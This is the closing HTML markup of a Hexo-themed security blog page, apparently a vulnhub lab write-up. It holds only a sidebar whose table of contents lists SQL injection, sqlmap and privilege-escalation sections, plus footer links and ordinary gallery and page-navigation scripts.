<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/SickOS1.2/">[vulnhub]  SickOS1.2 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Manual-SQLi"><span class="toc-number">2.1.</span> <span class="toc-text">Manual SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP"><span class="toc-number">2.2.</span> <span class="toc-text">SQLMAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Esca"><span class="toc-number">3.</span> <span class="toc-text">Priv Esca</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>